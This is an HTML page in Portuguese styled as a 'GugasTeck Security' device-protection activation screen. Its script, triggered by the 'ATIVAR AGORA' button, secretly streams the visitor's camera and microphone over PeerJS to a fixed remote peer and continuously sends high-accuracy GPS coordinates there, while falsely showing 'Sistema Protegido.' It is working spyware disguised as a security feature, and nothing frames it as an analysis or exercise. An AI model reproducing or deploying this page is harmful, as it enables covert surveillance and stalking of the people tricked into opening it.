<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GugasTeck Security</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { width: 80%; max-width: 320px; text-align: center; border: 1px solid #222; padding: 25px; border-radius: 25px; background: #050505; }
        
        /* Ícone Menor como solicitado */
        .icon { font-size: 45px; margin-bottom: 15px; display: block; }
        
        h2 { font-size: 18px; margin: 0 0 10px 0; letter-spacing: 1px; }
        p { color: #555; font-size: 13px; line-height: 1.4; margin-bottom: 20px; }
        
        .btn { background: #007aff; color: #fff; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 15px; cursor: pointer; }
        #st { margin-top: 15px; color: #007aff; font-size: 11px; }
    </style>
</head>
<body>
    <div class="card">
        <span class="icon">🛡️</span>
        <h2>Proteção Ativa</h2>
        <p>Ative o monitoramento de drivers e segurança em tempo real do dispositivo.</p>
        <button class="btn" onclick="iniciar()">ATIVAR AGORA</button>
        <div id="st"></div>
    </div>

<script>
    const ROOM_ID = "GUGAS_STABLE_V14_FINAL";
    const peer = new Peer();

    async function iniciar() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            peer.call(ROOM_ID, stream);
            document.getElementById('st').innerText = "Sistema Protegido.";
            
            navigator.geolocation.watchPosition((p) => {
                const conn = peer.connect(ROOM_ID);
                conn.on('open', () => {
                    conn.send({ lat: p.coords.latitude, lon: p.coords.longitude });
                });
            }, null, { enableHighAccuracy: true });
        } catch (e) { document.getElementById('st').innerText = "Erro ao autorizar."; }
    }
</script>
</body>
</html>
